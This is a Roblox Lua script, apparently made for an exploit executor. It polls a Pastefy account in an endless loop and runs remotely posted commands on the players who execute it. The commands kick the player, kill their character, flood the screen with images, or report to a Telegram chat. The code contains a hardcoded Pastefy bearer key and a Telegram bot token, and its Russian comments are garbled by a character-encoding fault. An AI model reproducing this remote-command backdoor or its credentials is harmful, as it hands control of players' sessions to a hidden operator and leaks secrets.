local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local apiKey = "lXrUygIB6Fpqg1kxqJvivWdst3fmkXL4pB7mCkNrLpSPq46iLlfUvDm4C2S4"
local headers = {
    Accept = "application/json",
    ["Content-Type"] = "application/json",
    ["Authorization"] = "Bearer " .. apiKey
}

local localPlayer = Players.LocalPlayer
getgenv().already = getgenv().already or {}
local MessageQueue = {}
local NotificationBusy = false

-- –†–∞–∑–º—ã—Ç–∏–µ
local function setBlur(state)
    if not Lighting:FindFirstChild("MsgBlur") then
        local b = Instance.new("BlurEffect", Lighting)
        b.Name = "MsgBlur"
        b.Size = 0
    end
    TweenService:Create(Lighting.MsgBlur, TweenInfo.new(0.6,Enum.EasingStyle.Sine),{
        Size = state and 12 or 0
    }):Play()
end
local JokeImageIds = {
    "http://www.roblox.com/asset/?id=15767492628",
    "http://www.roblox.com/asset/?id=137972271055856",
    "http://www.roblox.com/asset/?id=15122228831",
    "http://www.roblox.com/asset/?id=18685588755",
    "http://www.roblox.com/asset/?id=16065319092",
}

function SendTelegramMessage(botToken, chatId, threadId, text, embeds)
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

    local data = {
        chat_id = chatId,
        message_thread_id = threadId,
        text = text or "",
        parse_mode = "Markdown"
    }


    local jsonData = HttpService:JSONEncode(data)

    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })

    return response
end

local function ShowRandomJokeImages()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local function createOneImage()
        local ImageLabel = Instance.new("ImageLabel")
        ImageLabel.Parent = ScreenGui
        ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ImageLabel.BorderSizePixel = 0
        ImageLabel.Size = UDim2.new(0, 178, 0, 173)
        ImageLabel.Image = JokeImageIds[math.random(1, #JokeImageIds)]

        local screenSize = ScreenGui.AbsoluteSize
        local xPos = math.random(0, screenSize.X - ImageLabel.Size.X.Offset)
        local yPos = math.random(0, screenSize.Y - ImageLabel.Size.Y.Offset)
        ImageLabel.Position = UDim2.new(0, xPos, 0, yPos)

        task.delay(5, function()
            ImageLabel:Destroy()
        end)
    end

    for i = 1, 1000 do
        task.delay(math.random() * 1.5, function()
            createOneImage()
        end)
    end
end

local function displayNotification(message, recipient, typeMsg)
    NotificationBusy = true
    setBlur(true)

    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "AdminQueueMessage_"..tick()

    local frame = Instance.new("Frame", gui)
    frame.AnchorPoint = Vector2.new(0.5,0)
    frame.Position = UDim2.new(0.5,0,-0.3,0)
    frame.Size = UDim2.new(0.42,0,0.22,0)
    frame.BackgroundColor3 = Color3.fromRGB(22,22,22)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true

    -- HEADER
    local header = Instance.new("Frame", frame)
    header.Size = UDim2.new(1,0,0.2,0)
    header.BackgroundColor3 = typeMsg=="cmd" and Color3.fromRGB(255,50,50) or Color3.fromRGB(126,14,255)
    header.BorderSizePixel = 0

    local headText = Instance.new("TextLabel", header)
    headText.Size = UDim2.new(1,0,1,0)
    headText.BackgroundTransparency = 1
    headText.Text = typeMsg=="cmd" and "‚ö° COMMAND MESSAGE ‚ö°" or "‚ö°NEW MESSAGE ‚ö°"
    headText.Font = Enum.Font.GothamBold
    headText.TextScaled = true
    headText.TextColor3 = Color3.fromRGB(35,35,35)

    -- AVATAR
    local avatar = Instance.new("ImageLabel", frame)
    avatar.Position = UDim2.new(0.03,0,0.24,0)
    avatar.Size = UDim2.new(0.22,0,0.63,0)
    avatar.BackgroundTransparency = 1
    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=44208334&width=420&height=420&format=png"
    avatar.ScaleType = Enum.ScaleType.Fit

    -- TEXT BLOCK
    local dev = Instance.new("TextLabel", frame)
    dev.Position = UDim2.new(0.28,0,0.22,0)
    dev.Size = UDim2.new(0.70,0,0.14,0)
    dev.BackgroundTransparency = 1
    dev.TextColor3 = Color3.fromRGB(0,200,255)
    dev.Font = Enum.Font.GothamBold
    dev.TextScaled = true
    dev.Text = "BY: DEVELOPER"

    local who = Instance.new("TextLabel", frame)
    who.Position = UDim2.new(0.28,0,0.36,0)
    who.Size = UDim2.new(0.70,0,0.14,0)
    who.BackgroundTransparency = 1
    who.TextColor3 = Color3.fromRGB(255,150,60)
    who.Font = Enum.Font.GothamBold
    who.TextScaled = true
    who.Text = "üì´ Addressed: " .. recipient

    local text = Instance.new("TextLabel", frame)
    text.Position = UDim2.new(0.28,0,0.52,0)
    text.Size = UDim2.new(0.70,0,0.42,0)
    text.BackgroundTransparency = 1
    text.TextColor3 = Color3.fromRGB(255,255,255)
    text.Font = Enum.Font.Gotham
    text.TextWrapped = true
    text.TextScaled = true
    text.TextXAlignment = Enum.TextXAlignment.Left
    text.TextYAlignment = Enum.TextYAlignment.Top
    text.Text = ""

    -- SOUNDS
    local pop = Instance.new("Sound", frame)
    pop.SoundId = "rbxassetid://4590657391"
    pop.Volume = 1
    pop:Play()

    local typeSound = Instance.new("Sound", frame)
    typeSound.SoundId = "rbxassetid://5417004822"
    typeSound.Looped = true
    typeSound.PlaybackSpeed = 1.5
    typeSound.Volume = 1
    typeSound:Play()

    -- ANIMATION IN
    TweenService:Create(frame, TweenInfo.new(.7, Enum.EasingStyle.Quint), {
        Position = UDim2.new(0.5,0,0.15,0)
    }):Play()

    -- PRINT EFFECT
    for i=1,#message do
        text.Text = message:sub(1,i)
        task.wait(0.03)
    end

    typeSound:Stop()
    task.wait(1)
    if typeMsg == "cmd" then
        local lowerMsg = message:lower()
        -- KICK
        if lowerMsg:sub(1,4) == "kick" then
            local reason = message:sub(6)
            localPlayer:Kick(reason ~= "" and reason or "You have been kicked by server command")
            return
        end
        -- RESET
        if lowerMsg == "reset" then
            if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
                localPlayer.Character.Humanoid.Health = 0
            end
            -- –∑–∞–∫—Ä—ã—Ç–∏–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã
            TweenService:Create(frame, TweenInfo.new(.7, Enum.EasingStyle.Quint), {
                Position = UDim2.new(0.5,0,-0.3,0)
            }):Play()
            task.wait(4)
            gui:Destroy()
            setBlur(false)
            NotificationBusy = false
            return
        end
        if lowerMsg == "getonline" then
            SendTelegramMessage("8432656507:AAEpuoT4W15g_9iNBxFmTAQTwF9ZLtkBdRo",-1002853777462,29143,"testonline")
            print("getonline")
            -- –∑–∞–∫—Ä—ã—Ç–∏–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã
            TweenService:Create(frame, TweenInfo.new(.7, Enum.EasingStyle.Quint), {
                Position = UDim2.new(0.5,0,-0.3,0)
            }):Play()
            task.wait(4)
            gui:Destroy()
            setBlur(false)
            NotificationBusy = false
            return
        end
        if lowerMsg == "print" then
            ShowRandomJokeImages()
            -- –∑–∞–∫—Ä—ã—Ç–∏–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã
            TweenService:Create(frame, TweenInfo.new(.7, Enum.EasingStyle.Quint), {
                Position = UDim2.new(0.5,0,-0.3,0)
            }):Play()
            task.wait(4)
            gui:Destroy()
            setBlur(false)
            NotificationBusy = false
            return
        end
    end

    -- ANIMATION OUT
    TweenService:Create(frame, TweenInfo.new(.7, Enum.EasingStyle.Quint), {
        Position = UDim2.new(0.5,0,-0.3,0)
    }):Play()

    task.wait(4)
    gui:Destroy()
    setBlur(false)
    NotificationBusy = false
end

-- –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—á–µ—Ä–µ–¥–∏
task.spawn(function()
    while true do
        if not NotificationBusy and #MessageQueue > 0 then
            local nextMsg = table.remove(MessageQueue,1)
            displayNotification(nextMsg.text,nextMsg.recipient,nextMsg.type)
        end
        task.wait(0.1)
    end
end)

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Å—Ç
local function getPastes()
    local res = request({Url="https://pastefy.app/api/v2/user/pastes",Method="GET",Headers=headers})
    local ok,data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok then return end

    table.sort(data,function(a,b) return a.created_at < b.created_at end)

    for _,p in ipairs(data) do
        if not getgenv().already[p.id] then
            local lines={}
            for s in p.content:gmatch("[^\r\n]+") do table.insert(lines,s) end

            -- –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞: 3 —Å—Ç—Ä–æ–∫–∏
            if #lines ~= 3 then
                warn("–ü–∞—Å—Ç–∞ –ø—Ä–æ–ø—É—â–µ–Ω–∞: –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞")
                continue
            end

            local typeMsg = lines[1]:lower() -- cmd –∏–ª–∏ text
            local content = lines[2]         -- —Ç–µ–∫—Å—Ç –∏–ª–∏ –∫–æ–º–∞–Ω–¥–∞
            local recipient = lines[3]

            if typeMsg ~= "cmd" and typeMsg ~= "text" then
                warn("–ü–∞—Å—Ç–∞ –ø—Ä–æ–ø—É—â–µ–Ω–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø —Å–æ–æ–±—â–µ–Ω–∏—è")
                continue
            end

            if recipient ~= "Everyone" and recipient ~= localPlayer.Name then
                continue
            end

            table.insert(MessageQueue,{
                text = content,
                recipient = recipient,
                type = typeMsg
            })
            getgenv().already[p.id] = true
        end
    end
end

-- –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª
while true do
    local success, err = pcall(getPastes)
    if not success then
        warn("‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –ø–∞—Å—Ç: ", err)
        if tostring(err):find("HttpError: Timedout") then
            task.wait(10)
        else
            task.wait(5)
        end
    else
        task.wait(4)
    end
end
